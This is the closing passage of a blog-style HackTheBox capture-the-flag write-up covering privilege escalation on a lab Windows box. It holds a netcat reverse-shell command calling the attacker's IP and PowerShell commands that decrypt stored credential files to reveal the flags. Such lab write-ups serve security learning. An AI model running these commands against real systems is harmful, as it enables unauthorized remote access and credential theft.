</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ping -n 3 127.0.0.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>cls</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>GOTO</span> <span class=p>:</span><span class=nl>LOOP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>EXIT</span>
</span></span></code></pre></td></tr></table></div></div><p>Here we are we obtained the credentials of the users.</p><h2 id=privilege-escalation--stage-2>Privilege Escalation : stage 2<a hidden class=anchor aria-hidden=true href=#privilege-escalation--stage-2>#</a></h2><p>It no use to break our brain cells trying some &ldquo;runas&rdquo; commands. We can use those
credentials over the device portal (http://10.10.10.204:8080).</p><p>Then in the <em>Process</em> menu, there is a <em>Run Command</em> sub-menu.</p><p>When trying to run <code>C:\Windows\temp\nc64.exe 10.10.14.173 8888 -e powershell</code>
we have an access denied.</p><p>So let&rsquo;s try the decrypt command directly</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powershell</span> <span class=nv>$credential</span> <span class=p>=</span> <span class=nb>Import-CliXml</span> <span class=n>-Path</span> <span class=n>U:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>app</span><span class=p>\</span><span class=n>user</span><span class=p>.</span><span class=n>txt</span><span class=p>;</span> <span class=nv>$credential</span><span class=p>.</span><span class=py>GetNetworkCredential</span><span class=p>().</span><span class=py>Password</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>7cfd50f6bc34db3204898f1505ad9d70</span>
</span></span></code></pre></td></tr></table></div></div><p>Now let&rsquo;s do the same with the admin account.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powershell</span> <span class=nv>$credential</span> <span class=p>=</span> <span class=nb>Import-CliXml</span> <span class=n>-Path</span> <span class=n>U:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>administrator</span><span class=p>\</span><span class=n>root</span><span class=p>.</span><span class=n>txt</span><span class=p>;</span> <span class=nv>$credential</span><span class=p>.</span><span class=py>GetNetworkCredential</span><span class=p>().</span><span class=py>Password</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>5dbdce5569e2c4708617c0ce6e9bf11d</span>
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>